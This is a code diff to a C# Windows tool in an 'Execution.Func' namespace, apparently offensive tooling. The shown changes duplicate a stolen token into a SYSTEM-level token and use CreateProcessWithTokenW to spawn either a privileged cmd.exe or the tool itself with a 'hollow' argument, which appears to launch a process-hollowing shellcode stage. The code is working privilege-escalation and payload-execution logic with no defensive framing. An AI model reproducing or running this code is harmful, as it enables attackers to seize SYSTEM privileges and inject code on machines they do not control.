@@ -1,5 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
 using static Execution.Extensions.WinNative;
 
 namespace Execution.Func
@@ -41,27 +43,43 @@ namespace Execution.Func
             IntPtr hSystemToken = IntPtr.Zero;
             DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
 
+            StringBuilder sbSystemDir = new StringBuilder(256);
+            uint res1 = GetSystemDirectory(sbSystemDir, 256);
+            IntPtr env = IntPtr.Zero;
+            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);
+
+            String name = WindowsIdentity.GetCurrent().Name;
+            Console.WriteLine("Impersonated user is: " + name);
+            RevertToSelf();
+
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
             STARTUPINFO si = new STARTUPINFO();
-            si.cb = Marshal.SizeOf(si);            
+            si.cb = Marshal.SizeOf(si);
+            si.lpDesktop = "WinSta0\\Default";
+
             string currentExecutablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-            Console.WriteLine(currentExecutablePath);
+            string command = currentExecutablePath;
+            string args = "hollow";
 
-            // if shell passed as argument it will spawn a new cmd.exe, else shellcode execution method
-            if (type.Equals("shell"))
-            {
-                CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
-            }
-            else
-            {
-                CreateProcessWithTokenW(hSystemToken, 0, null, $"\"{currentExecutablePath}\" exec", 0, IntPtr.Zero, null, ref si, out pi);
-            }
-
-            //if (!CreateProcessWithTokenW(hSystemToken, 0, null, $"\"{currentExecutablePath}\" exec", 0, IntPtr.Zero, null, ref si, out pi))
+            //if (!CreateProcessWithTokenW(hSystemToken, 0, command, args, 0, IntPtr.Zero, null, ref si, out pi))
             //{
             //    Console.WriteLine($"Failed to create process with token. Error: {Marshal.GetLastWin32Error()}");
             //    return;
             //}
+
+            // if shell passed as argument it will spawn a new cmd.exe, else shellcode execution method
+            if (type.Equals("shell"))
+            {
+                Console.WriteLine($"creating cmd as {name}");
+                CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\Windows\\System32\\cmd.exe", CreationFlags.UnicodeEnvironment, IntPtr.Zero, null, ref si, out pi);
+            }
+            else
+            {
+                Console.WriteLine($"creating {currentExecutablePath} exec as {name}");
+                CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, $"\"{currentExecutablePath}\" hollow", CreationFlags.UnicodeEnvironment, IntPtr.Zero, null, ref si, out pi);
+            }
+
+
         }
     }
 }
